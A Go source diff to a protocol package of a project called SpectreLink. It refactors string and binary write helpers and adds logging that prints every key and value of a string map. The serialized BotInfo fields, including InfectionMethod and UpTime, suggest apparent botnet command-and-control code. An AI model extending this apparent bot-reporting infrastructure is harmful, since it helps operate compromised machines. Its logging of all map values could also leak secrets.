@@ -1,6 +1,7 @@
 package proto
 
 import (
+	"SpectreLink/log"
 	"encoding/binary"
 	"errors"
 	"io"
@@ -22,12 +23,7 @@ func writeInt16(conn *Connection, val int16) error {
 }
 
 func writeString(conn *Connection, val string) error {
-	if err := writeInt32(conn, int32(len(val))); err != nil {
-		return err
-	}
-
-	_, err := conn.Write([]byte(val))
-	return err
+	return writeBinary(conn, []byte(val))
 }
 
 func writeBool(conn *Connection, val bool) error {
@@ -48,6 +44,7 @@ func writeStringMap(conn *Connection, val map[string]string) error {
 	}
 
 	for k, v := range val {
+		log.Infof("Key: %s, Value: %s", k, v)
 		if err := writeString(conn, k); err != nil {
 			return err
 		}
@@ -78,8 +75,13 @@ func writeBinary(conn *Connection, val []byte) error {
 		return err
 	}
 
-	_, err := conn.Write(val)
-	return err
+	if n, err := conn.Write(val); err != nil {
+		return err
+	} else if n != len(val) {
+		return errors.New("failed to write binary")
+	}
+
+	return nil
 }
 
 func readInt32(conn *Connection) (val int32, err error) {
@@ -396,10 +398,10 @@ func writeBotInfo(conn *Connection, v BotInfo) error {
 	if err := writeString(conn, v.InfectionMethod); err != nil {
 		return err
 	}
-	if err := writeInt32(conn, int32(v.Processors)); err != nil {
+	if err := writeInt32(conn, v.Processors); err != nil {
 		return err
 	}
-	if err := writeInt32(conn, int32(v.UpTime)); err != nil {
+	if err := writeInt32(conn, v.UpTime); err != nil {
 		return err
 	}
 	if err := writeFloat(conn, v.TotalMemory); err != nil {
